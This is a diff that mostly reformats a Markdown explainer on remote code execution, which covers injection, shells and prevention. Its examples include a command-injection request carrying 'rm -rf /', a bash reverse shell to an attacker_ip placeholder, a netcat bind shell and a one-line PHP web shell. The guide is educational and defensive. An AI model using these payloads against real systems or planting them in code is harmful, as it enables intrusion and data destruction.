@@ -1,8 +1,10 @@
-## Remote Code Execution (RCE)
+<br>
+
+# Remote Code Execution (RCE)
 Remote Code Execution (RCE) is **a critical security vulnerability that allows an attacker to execute arbitrary code on a remote machine, typically with the privileges of the exploited application or service**. Once RCE is achieved, attackers often escalate their privileges or establish persistent access by getting a shell on the target system.
 
 ## 1. How RCE Works
-RCE exploits vulnerabilities in applications, services, or protocols to execute code provided by the attacker. Common vectors include:
+RCE exploits vulnerabilities in applications, services, or protocols to execute code provided by the attacker.
   - **Input Validation Issues**
     - Unvalidated or unsanitized user input is directly processed as executable code.
     - Example: Command injection or deserialization vulnerabilities.
@@ -11,16 +13,19 @@ RCE exploits vulnerabilities in applications, services, or protocols to execute 
     - Example: Buffer overflows or use-after-free vulnerabilities.
   - **Configuration Weaknesses**
     - Misconfigured systems or applications allowing unintended code execution.
-    - Example: Misconfigured web servers executing user-uploaded scripts.
+    - Example: Misconfigured web servers executing user-uploaded scripts.  
+<br>
 
 ## 2. Techniques to Achieve RCE
 ### a. Injection Vulnerabilities
   - **Command Injection**
     - Injecting malicious commands into a vulnerable system that executes them.
-    - Example:
+    - Example  
+
 ```
 GET /ping?ip=127.0.0.1;rm -rf / HTTP/1.1
 ```
+
   - **SQL Injection with Execution**
     - Exploiting database functions to execute system commands.
     - Example: xp_cmdshell in SQL Server.
@@ -46,7 +51,8 @@ GET /ping?ip=127.0.0.1;rm -rf / HTTP/1.1
   - **Exposed APIs**
     - Sending payloads to vulnerable APIs that execute code.
   - **Weak Authentication**
-    - Exploiting poorly protected admin panels or services to execute commands.
+    - Exploiting poorly protected admin panels or services to execute commands.  
+<br>
 
 ## 3. Getting Shells
 Once RCE is achieved, attackers often aim to establish a shell for interactive access to the target system.
@@ -56,7 +62,8 @@ Once RCE is achieved, attackers often aim to establish a shell for interactive a
   - Mechanism:
     - The **attacker sets up a listener** on their machine.
     - The payload on the victim’s machine opens a connection to the attacker.
-  - Example (Bash):
+  - Example (Bash)  
+
 ```
 bash -i >& /dev/tcp/attacker_ip/port 0>&1
 ```
@@ -66,17 +73,21 @@ bash -i >& /dev/tcp/attacker_ip/port 0>&1
   - Mechanism:
     - The target machine opens a port and binds the shell to it.
     - **The attacker connects to this port** to access the shell.
-  - Example (Netcat):
+  - Example (Netcat)  
+
 ```
 nc -lvp 4444 -e /bin/bash
 ```
 
 ### c. Web Shell
   - Definition: A malicious script uploaded to a web server that provides remote command execution via HTTP requests.
-  - Example (PHP):
+  - Example (PHP)  
+
 ```
 <?php echo shell_exec($_GET['cmd']); ?>
 ```
+  
+<br>
 
 ## 4. Prevention of RCE and Shell Exploits
 ### a. Input Validation and Sanitization
@@ -108,7 +119,8 @@ nc -lvp 4444 -e /bin/bash
 
 ### g. Segmentation and Least Privilege
   - **Isolate critical systems** to limit the impact of RCE.
-  - Ensure processes run with the **minimum privileges** needed.
+  - Ensure processes run with the **minimum privileges** needed.  
+<br>
 
 ## 5. Tools Used by Attackers and Defenders
 
@@ -126,7 +138,8 @@ nc -lvp 4444 -e /bin/bash
   - **OSQuery**
     - **Monitors system** behavior to identify abnormal processes.
   - **SIEM Solutions**
-    - **Aggregates logs and alerts to detect RCE and shell activity**.
+    - **Aggregates logs and alerts to detect RCE and shell activity**.  
+<br>
 
 ## 6. Summary
 
@@ -138,4 +151,5 @@ nc -lvp 4444 -e /bin/bash
 | Prevention Strategies | Input validation, secure coding, patch management, and access controls. |
 | Key Tools | Metasploit, Netcat, WAFs, IDS, EDR. |
 
-**Remote Code Execution (RCE) is one of the most critical and dangerous vulnerabilities, often serving as a gateway to more severe attacks like data breaches or ransomware deployment**. By understanding how RCE works, including its techniques and preventive measures, organizations can significantly enhance their defenses against these threats and safeguard their systems from exploitation.
+**Remote Code Execution (RCE) is one of the most critical and dangerous vulnerabilities, often serving as a gateway to more severe attacks like data breaches or ransomware deployment**. By understanding how RCE works, including its techniques and preventive measures, organizations can significantly enhance their defenses against these threats and safeguard their systems from exploitation.  
+<br>
